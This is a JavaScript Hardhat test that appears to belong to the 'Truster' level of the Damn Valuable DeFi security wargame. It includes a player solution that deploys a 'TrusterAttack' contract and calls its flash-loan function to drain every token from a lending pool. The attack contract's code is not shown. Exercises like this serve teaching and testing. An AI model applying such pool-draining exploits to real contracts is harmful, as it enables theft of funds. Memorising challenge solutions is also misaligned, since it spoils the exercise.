import { expect } from 'chai';
import { ethers } from 'hardhat';

describe('[Challenge] Truster', function () {
  it('should take all tokens out of the pool', async function () {
    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    const [deployer, player] = await ethers.getSigners();

    const token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
    const pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token);
    expect(await pool.token()).to.equal(await token.getAddress());

    await token.transfer(pool, TOKENS_IN_POOL);
    expect(await token.balanceOf(pool)).to.equal(TOKENS_IN_POOL);

    expect(await token.balanceOf(player)).to.equal(0n);

    /** CODE YOUR SOLUTION HERE */
    const attack = await (await ethers.getContractFactory('TrusterAttack', player)).deploy(pool, token);
    await attack.excuteFlashLoan();

    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // Player has taken all tokens from the pool
    expect(await token.balanceOf(player)).to.equal(TOKENS_IN_POOL);
    expect(await token.balanceOf(pool)).to.equal(0n);
  });
});
